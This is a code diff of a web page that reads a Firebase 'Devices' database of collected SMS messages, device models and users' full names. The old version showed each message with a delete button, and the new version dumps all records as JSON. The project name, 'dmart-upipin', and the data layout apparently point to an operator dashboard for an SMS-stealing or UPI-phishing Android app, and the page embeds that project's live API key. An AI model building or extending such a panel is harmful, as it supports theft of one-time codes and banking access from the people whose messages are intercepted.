@@ -2,87 +2,38 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Realtime SMS Database</title>
+  <title>Realtime SMS Database (Full JSON)</title>
   <style>
-    body {font-family: Arial, sans-serif; margin: 40px;}
-    h2 {margin-top: 30px;}
-    .sms-card{background:#f9f9f9;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:6px;}
-    .delete-btn{background:#d9534f;color:#fff;border:none;padding:5px 10px;border-radius:4px;cursor:pointer;}
+    body {font-family: monospace; margin: 40px; background: #f4f4f4;}
+    pre {background: #fff; padding: 20px; border: 1px solid #ccc; border-radius: 6px; white-space: pre-wrap; word-wrap: break-word;}
   </style>
 </head>
 <body>
-  <h1>Devices SMS (Realtime)</h1>
-  <div id="content">Loading...</div>
+  <h1>Devices JSON (Realtime)</h1>
+  <pre id="content">Loading...</pre>
 
   <!-- Firebase -->
   <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
   <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
   <script>
-const firebaseConfig = {
-  apiKey: "AIzaSyAsXFp45tGYHCEZ-z4uYR8o1MYb3EhLTZg",
-  authDomain: "dmart-upipin-1457-8-8-25.firebaseapp.com",
-  projectId: "dmart-upipin-1457-8-8-25",
-  storageBucket: "dmart-upipin-1457-8-8-25.firebasestorage.app",
-  messagingSenderId: "391446281272",
-  appId: "1:391446281272:android:19f745ba7d7dcd4b7e3acd",
-};
+    const firebaseConfig = {
+      apiKey: "AIzaSyAsXFp45tGYHCEZ-z4uYR8o1MYb3EhLTZg",
+      authDomain: "dmart-upipin-1457-8-8-25.firebaseapp.com",
+      projectId: "dmart-upipin-1457-8-8-25",
+      storageBucket: "dmart-upipin-1457-8-8-25.firebasestorage.app",
+      messagingSenderId: "391446281272",
+      appId: "1:391446281272:android:19f745ba7d7dcd4b7e3acd",
+    };
 
     firebase.initializeApp(firebaseConfig);
     var db = firebase.database();
-
     const container = document.getElementById('content');
 
-    function render(snapshot){
-  container.innerHTML = '';
-  snapshot.forEach(function(deviceSnap){
-    const deviceId = deviceSnap.key;
-    const deviceData = deviceSnap.val();
-
-    // Display name priority: model > fullName > deviceId
-    let name = deviceId;
-    if(deviceData.DeviceInfo && deviceData.DeviceInfo.model){
-      name = deviceData.DeviceInfo.model;
-    }
-    else if(deviceData.input && deviceData.input.fullName){
-      name = deviceData.input.fullName;
-    }
-
-    const h2 = document.createElement('h2');
-    h2.innerText = name;
-    container.appendChild(h2);
-    
-    if(deviceData.sms){
-      Object.entries(deviceData.sms).forEach(([msgId, smsObj])=>{
-        const card = document.createElement('div');
-        card.className='sms-card';
-        card.innerHTML = `
-          <b>Sender:</b> ${smsObj.sender}<br/>
-          <b>Body:</b> ${smsObj.messageBody}<br/>
-          <b>Time:</b> ${smsObj.time}<br/>
-          <button class="delete-btn" onclick="deleteMsg('${deviceId}','${msgId}')">Delete</button>
-        `;
-        container.appendChild(card);
-      });
-    }
-    else{
-      const p = document.createElement('p');
-      p.innerText = 'No SMS found.';
-      container.appendChild(p);
-    }
-  });
-}
-
-    // ⏱ realtime listener
+    // Realtime listener that outputs full JSON
     db.ref('Devices').on('value', function(snapshot){
-      render(snapshot);
+      const data = snapshot.val();
+      container.textContent = JSON.stringify(data, null, 2); // pretty-print
     });
-
-    function deleteMsg(deviceId, msgId){
-      if(confirm('Delete this message?')){
-        db.ref(`Devices/${deviceId}/sms/${msgId}`).remove()
-          .catch(e => alert("Error: " + e.message));
-      }
-    }
   </script>
 </body>
 </html>
